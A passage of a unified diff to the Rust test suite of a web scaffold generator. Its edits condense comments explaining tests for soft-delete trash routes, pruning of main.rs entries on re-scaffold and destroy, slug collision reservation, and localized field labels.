-                // owner scoping; skip whatever the planner rejects rather than
-                // asserting on an error case this test is not about.
+                // The planner refuses some combinations (`--searchable` with an owner-scoped
+                // `--sharded` or `--live`, #1841); skip them.
                 let extra_fields: &[&str] = if owner { &["user:references"] } else { &[] };
                 let tmp = project_with_main(default_main());
                 let mut fields = bulk_fields();
@@ -25758,9 +23399,8 @@ exempt_paths = [
                          the two gates disagree, so the generated app would not compile"
                     );
                 }
-                // The generated lifecycle test is appended under the same gate,
-                // so it must track the handlers too — a test posting to routes
-                // the scaffold never emitted documents a lie.
+                // The generated lifecycle test sits behind the same gate, so it must appear exactly
+                // when the handlers do.
                 let test_src = action_contents(&plan, "tests/post.rs");
                 assert_eq!(
                     routes.contains("pub async fn trash("),
@@ -25798,11 +23438,9 @@ exempt_paths = [
         let main = fs::read_to_string(tmp.path().join("src/main.rs")).unwrap();
         assert!(main.contains("routes::posts::trash"), "{main}");
 
-        // Second run WITHOUT the flag — the shape people land on when they
-        // re-scaffold and forget to repeat it. `update_main_rs` only adds, so
-        // without the prune the three entries would survive pointing at
-        // handlers the fresh routes module no longer defines, and the generated
-        // project would stop compiling.
+        // Second run without the flag, as after a forgotten re-scaffold. `update_main_rs` only
+        // adds, so without the prune the trash entries would point at handlers that no longer exist
+        // and the project would not compile.
         plan_scaffold_with_options(
             tmp.path(),
             "Post",
@@ -25845,10 +23483,8 @@ exempt_paths = [
         .execute(Flags::default())
         .unwrap();
 
-        // `autumn destroy scaffold Post` without repeating `--soft-delete` —
-        // the flag was typed once, days ago. The revert deletes the routes
-        // module, so any trash entry it leaves behind in `main.rs` points at a
-        // module that no longer exists and the remaining app stops compiling.
+        // `autumn destroy scaffold Post` without repeating `--soft-delete`. A trash entry left in
+        // `main.rs` would point at the deleted routes module.
         plan_scaffold_with_options_for_revert(
             tmp.path(),
             "Post",
@@ -25891,11 +23527,9 @@ exempt_paths = [
         )
         .unwrap();
         let routes = action_contents(&plan, "src/routes/posts.rs");
-        // `GET /posts/trash` is a static sibling of `GET /posts/{slug}`, and the
-        // router always prefers the static one — so a post titled "Trash" whose
-        // slug derives to `trash` would be permanently unreachable at its own
-        // show page. The derived-slug collision probe must treat it as taken,
-        // exactly as it already does for `new` (and `search`).
+        // `GET /posts/trash` is a static sibling the router prefers over `GET /posts/{slug}`, so a
+        // slug of `trash` would be unreachable. The collision probe reserves it like `new` and
+        // `search`.
         assert!(
             routes.contains("candidate != \"trash\""),
             "a soft-delete slug scaffold must reserve the `trash` segment:\n{routes}"
@@ -25966,8 +23600,7 @@ exempt_paths = [
     #[test]
     fn api_soft_delete_scaffold_emits_no_trash_surface() {
         let plan = trash_plan(&trash_options(|o| o.api = true), &[]);
-        // `--api` emits no HTML routes module at all; the guard here is that
-        // `main.rs` mounts nothing from one either.
+        // `--api` emits no HTML routes module, so `main.rs` must mount nothing from one.
         let main = action_contents(&plan, "src/main.rs");
         for entry in ["::trash", "::restore", "::purge"] {
             assert!(
@@ -26799,7 +24432,6 @@ exempt_paths = [
             routes.contains("_ => None,"),
             "an unlisted code must keep autumn-web's default:\n{routes}"
         );
-        // Both re-rendering handlers, not just create.
         assert_eq!(
             routes.matches("form.into_changeset_with(").count(),
             2,
@@ -27599,7 +25231,6 @@ exempt_paths = [
             routes.contains(".override_label(\"title\", t!(locale, \"post.field.title\"))"),
             "form controls must relabel through the field key:\n{routes}"
         );
-        // One key, three surfaces: index header, show row, form label.
         assert!(
             routes.matches("\"post.field.author_name\"").count() >= 3,
             "the field key must serve index, show, and form:\n{routes}"
